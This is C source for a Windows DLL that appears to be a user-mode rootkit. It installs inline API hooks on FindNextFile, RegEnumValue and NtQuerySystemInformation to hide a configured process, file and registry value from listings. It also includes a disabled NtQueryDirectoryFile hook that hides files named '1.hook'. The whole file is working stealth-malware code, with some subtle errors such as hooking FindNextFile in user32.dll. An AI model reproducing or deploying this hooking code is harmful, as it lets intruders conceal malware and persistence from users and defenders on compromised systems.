
#include <stdio.h>
#include <stdbool.h>
#include <windows.h>
#include "Settings.inc"

//#define DEBUG
#define MAX_FILENAME	512
#define NTSTATUS		long int

typedef BOOL WINAPI (*FFindNextFile) (HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData);
FFindNextFile FindNextFileWNext;
FFindNextFile FindNextFileANext;

typedef LONG WINAPI (*FRegEnumValue) (HKEY hKey, DWORD dwIndex, LPTSTR lpValueName,LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
FRegEnumValue RegEnumValueWNext;
FRegEnumValue RegEnumValueANext;

typedef NTSTATUS NTAPI (*FNtQuerySystemInformation) (ULONG InfoClass,PVOID Buffer,ULONG Length,PULONG ReturnLength);
FNtQuerySystemInformation NtQuerySystemInformationNext;


typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG				   NextEntryOffset;
	ULONG				   NumberOfThreads;
	LARGE_INTEGER		   Reserved[3];
	LARGE_INTEGER		   CreateTime;
	LARGE_INTEGER		   UserTime;
	LARGE_INTEGER		   KernelTime;
	UNICODE_STRING		  ImageName;
	ULONG				   BasePriority;
	HANDLE				  ProcessId;
	HANDLE				  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO,*PSYSTEM_PROCESS_INFO;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemInformationClassMin = 0,
	SystemBasicInformation = 0,
	SystemProcessorInformation = 1,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemPathInformation = 4,
	SystemNotImplemented1 = 4,
	SystemProcessInformation = 5,
	SystemProcessesAndThreadsInformation = 5,
	SystemCallCountInfoInformation = 6,
	SystemCallCounts = 6,
	SystemDeviceInformation = 7,
	SystemConfigurationInformation = 7,
	SystemProcessorPerformanceInformation = 8,
	SystemProcessorTimes = 8,
	SystemFlagsInformation = 9,
	SystemGlobalFlag = 9,
	SystemCallTimeInformation = 10,
	SystemNotImplemented2 = 10,
	SystemModuleInformation = 11,
	SystemLocksInformation = 12,
	SystemLockInformation = 12,
	SystemStackTraceInformation = 13,
	SystemNotImplemented3 = 13,
	SystemPagedPoolInformation = 14,
	SystemNotImplemented4 = 14,
	SystemNonPagedPoolInformation = 15,
	SystemNotImplemented5 = 15,
	SystemHandleInformation = 16,
	SystemObjectInformation = 17,
	SystemPageFileInformation = 18,
	SystemPagefileInformation = 18,
	SystemVdmInstemulInformation = 19,
	SystemInstructionEmulationCounts = 19,
	SystemVdmBopInformation = 20,
	SystemInvalidInfoClass1 = 20,	
	SystemFileCacheInformation = 21,
	SystemCacheInformation = 21,
	SystemPoolTagInformation = 22,
	SystemInterruptInformation = 23,
	SystemProcessorStatistics = 23,
	SystemDpcBehaviourInformation = 24,
	SystemDpcInformation = 24,
	SystemFullMemoryInformation = 25,
	SystemNotImplemented6 = 25,
	SystemLoadImage = 26,
	SystemUnloadImage = 27,
	SystemTimeAdjustmentInformation = 28,
	SystemTimeAdjustment = 28,
	SystemSummaryMemoryInformation = 29,
	SystemNotImplemented7 = 29,
	SystemNextEventIdInformation = 30,
	SystemNotImplemented8 = 30,
	SystemEventIdsInformation = 31,
	SystemNotImplemented9 = 31,
	SystemCrashDumpInformation = 32,
	SystemExceptionInformation = 33,
	SystemCrashDumpStateInformation = 34,
	SystemKernelDebuggerInformation = 35,
	SystemContextSwitchInformation = 36,
	SystemRegistryQuotaInformation = 37,
	SystemLoadAndCallImage = 38,
	SystemPrioritySeparation = 39,
	SystemPlugPlayBusInformation = 40,
	SystemNotImplemented10 = 40,
	SystemDockInformation = 41,
	SystemNotImplemented11 = 41,
	/* SystemPowerInformation = 42, Conflicts with POWER_INFORMATION_LEVEL 1 */
	SystemInvalidInfoClass2 = 42,
	SystemProcessorSpeedInformation = 43,
	SystemInvalidInfoClass3 = 43,
	SystemCurrentTimeZoneInformation = 44,
	SystemTimeZoneInformation = 44,
	SystemLookasideInformation = 45,
	SystemSetTimeSlipEvent = 46,
	SystemCreateSession = 47,
	SystemDeleteSession = 48,
	SystemInvalidInfoClass4 = 49,
	SystemRangeStartInformation = 50,
	SystemVerifierInformation = 51,
	SystemAddVerifier = 52,
	SystemSessionProcessesInformation	= 53,
	SystemInformationClassMax
} SYSTEM_INFORMATION_CLASS;


// File

 typedef enum _FILE_INFORMATION_CLASS
 {
   FileDirectoryInformation = 1, 
   FileFullDirectoryInformation,
   FileIdFullDirectoryInformation,
   FileBothDirectoryInformation,
   FileIdBothDirectoryInformation,
   FileBasicInformation,
   FileStandardInformation,
   FileInternalInformation,
   FileEaInformation,
   FileAccessInformation,
   FileNameInformation,
   FileRenameInformation,
   FileLinkInformation,
   FileNamesInformation,
   FileDispositionInformation,
   FilePositionInformation,
   FileFullEaInformation,
   FileModeInformation,
   FileAlignmentInformation,
   FileAllInformation,
   FileAllocationInformation,
   FileEndOfFileInformation,
   FileAlternateNameInformation,
   FileStreamInformation,
   FilePipeInformation,
   FilePipeLocalInformation,
   FilePipeRemoteInformation,
   FileMailslotQueryInformation,
   FileMailslotSetInformation,
   FileCompressionInformation,
   FileObjectIdInformation,
   FileCompletionInformation,
   FileMoveClusterInformation,
   FileQuotaInformation,
   FileReparsePointInformation,
   FileNetworkOpenInformation,
   FileAttributeTagInformation,
   FileTrackingInformation,
   FileMaximumInformation 
 } FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;
 
typedef struct _IO_STATUS_BLOCK 
 { 
    NTSTATUS Status; 
    ULONG Information;
 } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK; 
 
typedef VOID __stdcall
(*PIO_APC_ROUTINE)(
  /*IN*/ PVOID ApcContext,
  /*IN*/ PIO_STATUS_BLOCK IoStatusBlock,
  /*IN*/ ULONG Reserved);
 #define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)
  #define NT_SUCCESS(Status) ((NTSTATUS)(Status)>=0)
 
 typedef struct _FILE_BOTH_DIRECTORY_INFORMATION 
 { 
  ULONG NextEntryOffset;
  ULONG Unknown;
  LARGE_INTEGER CreationTime; 
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG FileAttributes;
  ULONG FileNameLength;
  ULONG EaInformationLength;
  UCHAR AlternateNameLength;
  WCHAR AlternateName[12];
  WCHAR FileName[1];
 } FILE_BOTH_DIR_INFORMATION,*PFILE_BOTH_DIR_INFORMATION;
 
 typedef struct _FILE_DIRECTORY_INFORMATION
 {
      ULONG         NextEntryOffset;
      ULONG         FileIndex;
      LARGE_INTEGER CreationTime;
      LARGE_INTEGER LastAccessTime;
      LARGE_INTEGER LastWriteTime;
      LARGE_INTEGER ChangeTime;
      LARGE_INTEGER EndOfFile;
      LARGE_INTEGER AllocationSize;
      ULONG         FileAttributes;
      ULONG         FileNameLength;
      WCHAR         FileName[1];
  } FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;
  
typedef NTSTATUS WINAPI (*FNtQueryDirectoryFile) (HANDLE FileHandle, HANDLE Event OPTIONAL, PIO_APC_ROUTINE ApcRoutine OPTIONAL,IN PVOID ApcContext OPTIONAL, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG FileInformationLength, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry,  PUNICODE_STRING FileName OPTIONAL, BOOLEAN RestartScan);
FNtQueryDirectoryFile NtQueryDirectoryFileNext;


BOOL Unicode16ToAnsi(wchar_t *in_Src, char *out_Dst, int in_MaxLen)
{
    BOOL lv_UsedDefault;
	if (in_MaxLen <= 0) return FALSE;
	int lv_Len = WideCharToMultiByte(CP_ACP, 0, in_Src, -1, out_Dst, in_MaxLen, 0, &lv_UsedDefault);
	if (lv_Len < 0) lv_Len = 0;
	if (lv_Len < in_MaxLen) out_Dst[lv_Len] = 0;
	else if (out_Dst[in_MaxLen-1]) out_Dst[0] = 0;
	return !lv_UsedDefault;
}

char CharToUpper(char c)
{
	return ((c < 123 && c > 96) ? (c - 32) : c);
}

int StrCaseCompare(char *Str1, char *Str2)
{
	if (Str1 == NULL || Str2 == NULL) return -1;
	char *s1 = Str1, *s2 = Str2;
	
	while (*s1 != '\0' && *s2 != '\0')
	{
		if (CharToUpper(*s1++) != CharToUpper(*s2++)) return -1;
	}
	if (*s1 != *s2) return -1;
	else return 0;
}

NTSTATUS NTAPI NtQuerySystemInformationHook(ULONG InfoClass,PVOID Buffer,ULONG Length,PULONG ReturnLength)
{
	PSYSTEM_PROCESS_INFO LastProcessInfo, ProcessInfo;
	DWORD Offset;
 
	NTSTATUS Result = NtQuerySystemInformationNext(InfoClass, Buffer, Length, ReturnLength);
	
	if (Result != 0) return Result;
	
	if (InfoClass == SystemProcessesAndThreadsInformation)
	{
		Offset = 0;
		LastProcessInfo = NULL;
		do
		{
			ProcessInfo = (PSYSTEM_PROCESS_INFO) (Buffer + Offset);

			char EntryName[MAX_FILENAME];
			Unicode16ToAnsi((wchar_t *) ProcessInfo->ImageName.Buffer, EntryName, sizeof(EntryName));
			
			if (StrCaseCompare(EntryName, HIDDEN_PROCESS_NAME) == 0)
			{
				if (ProcessInfo->NextEntryOffset == 0)
				{
					if (LastProcessInfo != NULL) LastProcessInfo->NextEntryOffset = 0;
					return Result;
				}
				else
				{
					LastProcessInfo->NextEntryOffset = LastProcessInfo->NextEntryOffset + ProcessInfo->NextEntryOffset;
				}
			}
			else
			{
				LastProcessInfo = ProcessInfo;
			}
			Offset = Offset + ProcessInfo->NextEntryOffset;
		}
		while (ProcessInfo->NextEntryOffset != 0);
	}
	return Result;
}


NTSTATUS WINAPI NtQueryDirectoryFileHook(HANDLE FileHandle, HANDLE Event OPTIONAL, PIO_APC_ROUTINE ApcRoutine OPTIONAL,IN PVOID ApcContext OPTIONAL, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG FileInformationLength, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry,  PUNICODE_STRING FileName OPTIONAL, BOOLEAN RestartScan)
{
NTSTATUS Status=STATUS_SUCCESS;
Status=NtQueryDirectoryFileNext(FileHandle,Event,ApcRoutine,ApcContext, IoStatusBlock,FileInformation,FileInformationLength, FileInformationClass,ReturnSingleEntry,FileName,RestartScan);

if (!NT_SUCCESS(Status))
{
  return Status;
}

//////////////////////////////////
if (FileBothDirectoryInformation==FileInformationClass)
{
  FILE_BOTH_DIR_INFORMATION* pFileInfo = (FILE_BOTH_DIR_INFORMATION*)FileInformation;
  FILE_BOTH_DIR_INFORMATION* pLastFileInfo = NULL;
  BOOL bLastFlag=FALSE;
  do
  {
   bLastFlag=!(pFileInfo->NextEntryOffset);
    MessageBoxW(0, pFileInfo->FileName, pFileInfo->FileName, 0);
   if (NULL!=wcsstr(pFileInfo->FileName,L"1.hook"))
   {
    if (bLastFlag) //链表里最后一个文件
    {

     pLastFileInfo->NextEntryOffset=0;
     break;
    }
    else
    {
     int iPos = (ULONG)pFileInfo - (ULONG)FileInformation;
     int iLeft = (ULONG)FileInformationLength - iPos - pFileInfo->NextEntryOffset;

     RtlCopyMemory( (PVOID)pFileInfo, (PVOID)( (char *)pFileInfo + pFileInfo->NextEntryOffset ), iLeft );
                      continue;
    }
   }

   pLastFileInfo=pFileInfo;
   pFileInfo=(PFILE_BOTH_DIR_INFORMATION)((CHAR*)pFileInfo+pFileInfo->NextEntryOffset);

  }while(!bLastFlag);
}
return Status;
}




BOOL WINAPI FindNextFileAHook(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData)
{
	BOOL Result = FindNextFileANext(hFindFile, lpFindFileData);
	if (StrCaseCompare(HIDDEN_FILE_NAME, lpFindFileData->cFileName) == 0)
	{
		Result = FindNextFileANext(hFindFile, lpFindFileData);
	}
	return Result;
}

BOOL WINAPI FindNextFileWHook(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData)
{
	char EntryName[MAX_FILENAME];
	BOOL Result = FindNextFileWNext(hFindFile, lpFindFileData);
	Unicode16ToAnsi((wchar_t *) lpFindFileData->cFileName, EntryName, sizeof(EntryName));
	if (StrCaseCompare(HIDDEN_FILE_NAME, EntryName) == 0)
	{
		Result = FindNextFileWNext(hFindFile, lpFindFileData);
	}
	return Result;
}

LONG WINAPI RegEnumValueAHook(HKEY hKey, DWORD dwIndex, LPTSTR lpValueName,LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
{
	LONG Result = RegEnumValueANext(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);
	if (StrCaseCompare(HIDDEN_REGISTRY_ENTRY, lpValueName) == 0)
	{
		Result = RegEnumValueWNext(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);
	}
	return Result;
}

LONG WINAPI RegEnumValueWHook(HKEY hKey, DWORD dwIndex, LPTSTR lpValueName,LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
{
	char EntryName[MAX_FILENAME];
	LONG Result = RegEnumValueWNext(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);
	Unicode16ToAnsi((wchar_t *) lpValueName, EntryName, sizeof(EntryName));
	if (StrCaseCompare(HIDDEN_REGISTRY_ENTRY, EntryName) == 0)
	{
		Result = RegEnumValueWNext(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);
	}
	return Result;
}

bool Win32HookAPI(char *DLLName, char *FunctionName, void *NewFunction, void **BackupFunction)
{
	DWORD dwOldProtection  = 0;
	HANDLE hModule = LoadLibrary(DLLName);	// LoadLibrary and not GetModuleHandle incase it's not Loaded Yet
	if (hModule == NULL) return false;
	DWORD FunctionAddress = (DWORD) GetProcAddress(hModule, FunctionName);
	if (FunctionAddress == 0) return false;
	if (*(WORD *) FunctionAddress == 0xFF8B)	// MOV EDI, EDI
	{
		char Detour[] = "\xEB\xF9"; // JMP $-5 (0xEB = rel8)
		char JmpOpcode[] = "\xE9";	// JMP 0xAddress (0xE9 = rel16/32)
		VirtualProtect((void *) FunctionAddress - 5, 0x08, PAGE_READWRITE, &dwOldProtection); // Disable Memory Protection.
		memcpy((void *) FunctionAddress, Detour, 0x02);
		DWORD NewFunctionAddress = (DWORD) NewFunction - FunctionAddress;
		memcpy((void *) FunctionAddress - 5, JmpOpcode, 0x01);
		memcpy((void *) FunctionAddress - 4, (void *) &NewFunctionAddress, 0x04);
		VirtualProtect((void *) FunctionAddress - 5, 0x08, PAGE_EXECUTE_READ, &dwOldProtection); //Restore Memory Protection
		*BackupFunction = (void *) FunctionAddress + 2;
		return true;
	}
	return false;
}

#define JmpSize 5

void *HookAddress(void *Address, void *NewFunction, int BytesCount)
{
	if ((DWORD) Address == 0) return NULL;
	unsigned char JmpOpcode[] = "\xE9";		// JMP 0xAddress (0xE9 rel16/32)
	void *CodeBlock = VirtualAlloc(NULL, BytesCount + JmpSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (CodeBlock == NULL) return NULL;
	memcpy(CodeBlock, Address, BytesCount);
	memcpy(CodeBlock + BytesCount, JmpOpcode, 1);
	DWORD BackupFunctionJmpAddress = (DWORD) Address - ((DWORD) CodeBlock + BytesCount); // BytesCount (Local From Begining of Code Block Canceled Bytes Skipped from The begining of the Hooked Call)
	DWORD NewFunctionAddress = (DWORD) NewFunction - (DWORD) Address - JmpSize;
	DWORD dwOldProtection = 0;
	if (VirtualProtect((void *) Address, BytesCount + JmpSize, PAGE_READWRITE, &dwOldProtection)) // Disable Memory Protection.
	{
		memcpy(CodeBlock + BytesCount + 1, (void *) &BackupFunctionJmpAddress, 4);
		memcpy(Address, JmpOpcode, 1);
		memcpy(Address + 1, (void *) &NewFunctionAddress, 4);
		if (VirtualProtect((void *) Address, BytesCount + JmpSize, PAGE_EXECUTE_READ, &dwOldProtection)) //Restore Memory Protection
		 return CodeBlock;
	}
	return NULL;
}

__declspec(dllexport) BOOL WINAPI _DllMain(HINSTANCE hinstDLL __attribute__((unused)), DWORD fdwReason, LPVOID lpvReserved __attribute__((unused)))
{
	#ifdef DEBUG
	char Information[MAX_PATH + 16], ProcessPath[MAX_PATH];
	if (GetModuleFileName(NULL, ProcessPath, sizeof(ProcessPath)))
	sprintf(Information, "Process Path: %s (PID: %d)", ProcessPath, (unsigned int) GetCurrentProcessId());
	#endif
	
	char MutexName[32];
	memset(MutexName, '\0', sizeof(MutexName));
	sprintf(MutexName, "ID%d", (int) GetCurrentProcessId());
	
	#ifdef DEBUG
	if (CreateMutex(NULL, false, MutexName) == NULL) MessageBox(0, "CreateMutex() Failed", "Process", 0);
	else
	{
		if (GetLastError() == ERROR_ALREADY_EXISTS) 
		 MessageBox(0, "Mutex Already Exists !", "Process", 0);
	}
	#else
	CreateMutex(NULL, false, MutexName);
	#endif
	
	switch (fdwReason)
    {
		case DLL_PROCESS_ATTACH:	// attach to process, called by our stub if loaded from memory
			#ifdef DEBUG
			MessageBox(0, Information, "_DllMain -> DLL_PROCESS_ATTACH", 0);
			#endif
			
			// File Hiding (Windows XP)
			Win32HookAPI("user32.dll", "FindNextFileW", (void *) FindNextFileWHook, (void *) &FindNextFileWNext);
			Win32HookAPI("user32.dll", "FindNextFileA", (void *) FindNextFileAHook, (void *) &FindNextFileANext);
			
			// Registry Value Hiding
			Win32HookAPI("advapi32.dll", "RegEnumValueA", (void *) RegEnumValueAHook, (void *) &RegEnumValueANext);
			Win32HookAPI("advapi32.dll", "RegEnumValueW", (void *) RegEnumValueWHook, (void *) &RegEnumValueWNext);
			
			// Process Hiding
			NtQuerySystemInformationNext = HookAddress((void *) GetProcAddress(LoadLibrary("ntdll.dll"), "NtQuerySystemInformation"), (void *) NtQuerySystemInformationHook, 10);
		//	NtQueryDirectoryFileNext = HookAddress((void *) GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryDirectoryFile"), (void *) NtQueryDirectoryFileHook, 10);
			break;
		
		case DLL_PROCESS_DETACH:	// detach from process, will never be called if loaded from memory
			#ifdef DEBUG
			MessageBox(0, "_DllMain -> DLL_PROCESS_DETACH", "DLL", 0);
			#endif
			break;
			
        case DLL_THREAD_ATTACH:	// attach to thread, will never be called if loaded from memory
            break;
			
        case DLL_THREAD_DETACH:	// detach from thread, will never be called if loaded from memory
            break;
    }
   
    return TRUE; // succesful
}
